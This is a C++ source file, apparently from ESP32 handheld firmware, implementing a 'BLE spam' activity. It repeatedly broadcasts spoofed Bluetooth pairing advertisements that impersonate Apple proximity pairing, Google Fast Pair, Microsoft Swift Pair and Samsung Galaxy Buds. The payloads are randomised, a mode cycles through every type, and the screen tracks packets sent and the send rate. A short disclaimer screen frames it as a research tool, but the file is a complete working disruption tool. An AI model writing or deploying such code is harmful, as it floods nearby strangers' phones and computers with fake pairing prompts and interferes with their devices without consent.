#include "BleSpamActivity.h"

#include <BLEAdvertising.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <GfxRenderer.h>
#include <I18n.h>
#include <Logging.h>
#include <esp_random.h>

#include "MappedInputManager.h"
#include "components/UITheme.h"
#include "fontIds.h"
#include "util/RadioManager.h"

// ---- helpers ----

const char* BleSpamActivity::advTypeName(AdvType type) {
  switch (type) {
    case APPLE_PROXIMITY:   return "Apple Proximity";
    case ANDROID_FAST_PAIR: return "Android Fast Pair";
    case WINDOWS_SWIFT_PAIR:return "Windows Swift Pair";
    case SAMSUNG_BUDS:      return "Samsung Buds";
    case RANDOM_ALL:        return "Random All";
    default:                return "Unknown";
  }
}

// ---- lifecycle ----

void BleSpamActivity::onEnter() {
  Activity::onEnter();
  state = DISCLAIMER;
  advType = RANDOM_ALL;
  menuIndex = static_cast<int>(RANDOM_ALL);
  sentCount = 0;
  startTime = 0;
  lastAdvTime = 0;
  lastDisplayMs = 0;
  currentRandomType = 0;
  requestUpdate();
}

void BleSpamActivity::onExit() {
  if (state == BROADCASTING) {
    BLEAdvertising* adv = BLEDevice::getAdvertising();
    if (adv) adv->stop();
    RADIO.shutdown();
  }
  Activity::onExit();
}

// ---- BLE operations ----

void BleSpamActivity::startBroadcasting() {
  RADIO.ensureBle();

  if (!BLEDevice::getInitialized()) {
    BLEDevice::init("");
  }

  sentCount = 0;
  startTime = millis();
  lastAdvTime = 0;
  lastDisplayMs = 0;
  currentRandomType = 0;
  state = BROADCASTING;
  requestUpdate();
}

void BleSpamActivity::stopBroadcasting() {
  BLEAdvertising* adv = BLEDevice::getAdvertising();
  if (adv) adv->stop();
  RADIO.shutdown();
  state = MENU;
  requestUpdate();
}

void BleSpamActivity::sendNextAdvertisement() {
  AdvType type = advType;
  if (type == RANDOM_ALL) {
    type = static_cast<AdvType>(currentRandomType % (ADV_TYPE_COUNT - 1));
    currentRandomType++;
  }

  switch (type) {
    case APPLE_PROXIMITY:    sendAppleProximityAdv();   break;
    case ANDROID_FAST_PAIR:  sendAndroidFastPairAdv();  break;
    case WINDOWS_SWIFT_PAIR: sendWindowsSwiftPairAdv(); break;
    case SAMSUNG_BUDS:       sendSamsungBudsAdv();      break;
    default: break;
  }

  sentCount++;
}

void BleSpamActivity::sendAppleProximityAdv() {
  // Apple proximity pairing — manufacturer data with company ID 0x004C.
  // Type 0x07 = proximity pairing. Device type byte randomised for variety.
  static const uint8_t deviceTypes[] = {
      0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A,
      0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14
  };

  uint8_t payload[27];
  payload[0] = 0x07;  // Proximity pairing type
  payload[1] = 0x19;  // Length
  payload[2] = deviceTypes[esp_random() % sizeof(deviceTypes)];
  for (int i = 3; i < 27; i++) {
    payload[i] = static_cast<uint8_t>(esp_random() & 0xFF);
  }
  payload[3]  = 0x01;
  payload[25] = 0x00;
  payload[26] = 0x00;

  BLEAdvertisementData advData;
  std::string mfgData;
  mfgData.reserve(2 + sizeof(payload));
  mfgData += static_cast<char>(0x4C);  // Apple company ID (little-endian low byte)
  mfgData += static_cast<char>(0x00);  // Apple company ID high byte
  mfgData.append(reinterpret_cast<const char*>(payload), sizeof(payload));
  advData.setManufacturerData(String(mfgData.data(), mfgData.size()));

  BLEAdvertising* adv = BLEDevice::getAdvertising();
  adv->stop();
  adv->setAdvertisementData(advData);
  adv->start();
}

void BleSpamActivity::sendAndroidFastPairAdv() {
  // Google Fast Pair — service data on UUID 0xFE2C with a 3-byte model ID.
  static const uint32_t modelIds[] = {
      0x0001F0, 0x000047, 0x470000, 0x00B727, 0xCD8256,
      0x0000F0, 0x000006, 0x00000A, 0x00000B, 0x00000C
  };
  uint32_t modelId = modelIds[esp_random() % (sizeof(modelIds) / sizeof(modelIds[0]))];

  BLEAdvertisementData advData;
  std::string serviceData;
  serviceData.reserve(3);
  serviceData += static_cast<char>((modelId >> 16) & 0xFF);
  serviceData += static_cast<char>((modelId >> 8)  & 0xFF);
  serviceData += static_cast<char>( modelId        & 0xFF);
  advData.setServiceData(BLEUUID(static_cast<uint16_t>(0xFE2C)), String(serviceData.data(), serviceData.size()));

  BLEAdvertising* adv = BLEDevice::getAdvertising();
  adv->stop();
  adv->setAdvertisementData(advData);
  adv->start();
}

void BleSpamActivity::sendWindowsSwiftPairAdv() {
  // Microsoft Swift Pair — manufacturer data with company ID 0x0006.
  BLEAdvertisementData advData;

  std::string mfgData;
  mfgData.reserve(10);
  mfgData += static_cast<char>(0x06);  // Microsoft company ID low byte
  mfgData += static_cast<char>(0x00);  // Microsoft company ID high byte
  mfgData += static_cast<char>(0x03);  // Swift Pair beacon type
  mfgData += static_cast<char>(0x00);  // Flags
  for (int i = 0; i < 6; i++) {
    mfgData += static_cast<char>(esp_random() & 0xFF);
  }
  advData.setManufacturerData(String(mfgData.data(), mfgData.size()));

  char name[16];
  snprintf(name, sizeof(name), "Device_%04X", static_cast<uint16_t>(esp_random()));
  advData.setName(name);
  advData.setFlags(ESP_BLE_ADV_FLAG_GEN_DISC | ESP_BLE_ADV_FLAG_BREDR_NOT_SPT);

  BLEAdvertising* adv = BLEDevice::getAdvertising();
  adv->stop();
  adv->setAdvertisementData(advData);
  adv->start();
}

void BleSpamActivity::sendSamsungBudsAdv() {
  // Samsung Galaxy Buds — manufacturer data with company ID 0x0075 (Samsung).
  BLEAdvertisementData advData;

  std::string mfgData;
  mfgData.reserve(14);
  mfgData += static_cast<char>(0x75);  // Samsung company ID low byte
  mfgData += static_cast<char>(0x00);  // Samsung company ID high byte
  mfgData += static_cast<char>(0x01);  // Type
  mfgData += static_cast<char>(esp_random() & 0xFF);  // Device model byte 0
  mfgData += static_cast<char>(esp_random() & 0xFF);  // Device model byte 1
  for (int i = 0; i < 10; i++) {
    mfgData += static_cast<char>(esp_random() & 0xFF);
  }
  advData.setManufacturerData(String(mfgData.data(), mfgData.size()));

  BLEAdvertising* adv = BLEDevice::getAdvertising();
  adv->stop();
  adv->setAdvertisementData(advData);
  adv->start();
}

// ---- loop ----

void BleSpamActivity::loop() {
  if (state == DISCLAIMER) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      finish();
      return;
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      state = MENU;
      requestUpdate();
    }
    return;
  }

  if (state == MENU) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      finish();
      return;
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Up)) {
      menuIndex = ButtonNavigator::previousIndex(menuIndex, ADV_TYPE_COUNT);
      requestUpdate();
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Down)) {
      menuIndex = ButtonNavigator::nextIndex(menuIndex, ADV_TYPE_COUNT);
      requestUpdate();
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      advType = static_cast<AdvType>(menuIndex);
      startBroadcasting();
    }
    return;
  }

  if (state == BROADCASTING) {
    unsigned long now = millis();
    if (now - lastAdvTime >= ADV_INTERVAL_MS) {
      lastAdvTime = now;
      sendNextAdvertisement();
    }
    if (now - lastDisplayMs >= DISPLAY_INTERVAL_MS) {
      lastDisplayMs = now;
      requestUpdate();
    }
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      stopBroadcasting();
      return;
    }
  }
}

// ---- render ----

void BleSpamActivity::render(RenderLock&&) {
  renderer.clearScreen();
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth  = renderer.getScreenWidth();
  const auto pageHeight = renderer.getScreenHeight();

  if (state == DISCLAIMER) {
    renderer.drawCenteredText(UI_12_FONT_ID, metrics.topPadding + metrics.headerHeight + 40,
                              "BLE Advertisement Research Tool", true, EpdFontFamily::BOLD);

    int y = metrics.topPadding + metrics.headerHeight + 100;
    renderer.drawCenteredText(UI_10_FONT_ID, y,
        "This tool sends BLE advertisements for wireless");
    y += 30;
    renderer.drawCenteredText(UI_10_FONT_ID, y,
        "research and testing purposes.");
    y += 50;
    renderer.drawCenteredText(UI_10_FONT_ID, y,
        "Use responsibly and only in environments");
    y += 30;
    renderer.drawCenteredText(UI_10_FONT_ID, y,
        "where you have permission.");

    const auto labels = mappedInput.mapLabels("Back", "Proceed", "", "");
    GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
    renderer.displayBuffer();
    return;
  }

  if (state == MENU) {
    GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight},
                   "BLE Advertisements");

    static const char* subtitles[] = {
        "Device pairing dialogs",
        "Google Fast Pair service",
        "Microsoft Swift Pair service",
        "Galaxy Buds pairing",
        "Cycle through all types",
    };

    const int headerBottom = metrics.topPadding + metrics.headerHeight;
    GUI.drawList(renderer,
                 Rect{0, headerBottom, pageWidth, pageHeight - headerBottom - metrics.buttonHintsHeight},
                 ADV_TYPE_COUNT,
                 menuIndex,
                 [](int i) -> std::string { return BleSpamActivity::advTypeName(static_cast<AdvType>(i)); },
                 [](int i) -> std::string { return (i >= 0 && i < ADV_TYPE_COUNT) ? subtitles[i] : ""; });

    const auto labels = mappedInput.mapLabels("Back", "Start", "^", "v");
    GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
    renderer.displayBuffer();
    return;
  }

  // BROADCASTING
  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "Broadcasting");

  const int headerBottom = metrics.topPadding + metrics.headerHeight;
  int y = headerBottom + 30;

  // Current advertisement type
  char typeBuf[40];
  snprintf(typeBuf, sizeof(typeBuf), "Type: %s", advTypeName(advType));
  renderer.drawCenteredText(UI_10_FONT_ID, y, typeBuf);
  y += 40;

  // Packets sent
  char pktBuf[32];
  snprintf(pktBuf, sizeof(pktBuf), "Packets sent: %d", sentCount);
  renderer.drawCenteredText(UI_12_FONT_ID, y, pktBuf, true, EpdFontFamily::BOLD);
  y += 50;

  // Elapsed time
  unsigned long elapsedMs = millis() - startTime;
  unsigned long elapsedSec = elapsedMs / 1000UL;
  unsigned long minutes = elapsedSec / 60UL;
  unsigned long seconds = elapsedSec % 60UL;
  char timeBuf[32];
  snprintf(timeBuf, sizeof(timeBuf), "Elapsed: %02lu:%02lu", minutes, seconds);
  renderer.drawCenteredText(UI_10_FONT_ID, y, timeBuf);
  y += 40;

  // Packets per second
  if (elapsedSec > 0) {
    char ppsBuf[32];
    snprintf(ppsBuf, sizeof(ppsBuf), "Rate: %lu pkt/s", static_cast<unsigned long>(sentCount) / elapsedSec);
    renderer.drawCenteredText(UI_10_FONT_ID, y, ppsBuf);
    y += 40;
  }

  // Activity animation — cycling dots
  static const char* const dotFrames[] = { ".", "..", "..." };
  int frame = static_cast<int>((millis() / DISPLAY_INTERVAL_MS) % 3);
  renderer.drawCenteredText(SMALL_FONT_ID, y, dotFrames[frame]);

  const auto labels = mappedInput.mapLabels("Stop", "", "", "");
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}
